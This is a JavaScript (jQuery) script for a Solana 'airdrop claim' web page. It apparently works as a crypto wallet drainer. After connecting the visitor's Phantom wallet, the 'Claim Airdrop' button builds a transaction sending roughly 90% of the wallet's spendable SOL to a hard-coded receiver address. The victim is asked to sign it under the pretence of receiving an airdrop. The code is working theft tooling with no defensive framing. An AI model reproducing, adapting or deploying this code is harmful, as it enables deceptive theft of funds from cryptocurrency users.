$(document).ready(function() {
    $('#connect-wallet').on('click', async function(event) {
        event.preventDefault();
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
                const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
                const walletBalance = await connection.getBalance(publicKey);
                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                const gasFeeBuffer = 50000; // 0.00005 SOL for fees

                if (walletBalance < minBalance + gasFeeBuffer) {
                    alert("Insufficient SOL. Please add at least " + ((minBalance + gasFeeBuffer - walletBalance) / 1e9) + " SOL.");
                    return;
                }

                $('#connect-wallet').text("Claim Airdrop");
                $('#connect-wallet').off('click').on('click', async function(event) {
                    event.preventDefault();
                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
                        const balanceForTransfer = walletBalance - minBalance - gasFeeBuffer;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient SOL for transfer.");
                            return;
                        }

                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.9),
                            })
                        );

                        transaction.feePayer = publicKey;
                        const blockhashObj = await connection.getLatestBlockhash('confirmed');
                        transaction.recentBlockhash = blockhashObj.blockhash;
                        transaction.lastValidBlockHeight = blockhashObj.lastValidBlockHeight;

                        const signed = await window.solana.signTransaction(transaction);
                        const txid = await connection.sendRawTransaction(signed.serialize(), {
                            skipPreflight: false,
                            maxRetries: 3,
                        });
                        await connection.confirmTransaction({
                            signature: txid,
                            blockhash: blockhashObj.blockhash,
                            lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
                        }, 'confirmed');

                        alert("Transaction successful.");
                    } catch (err) {
                        alert("Failed to process transaction: " + err.message);
                    }
                });
            } catch (err) {
                alert("Failed to connect to Phantom Wallet: " + err.message);
            }
        } else {
            alert("Phantom Wallet not detected. Please install it.");
        }
    });
});
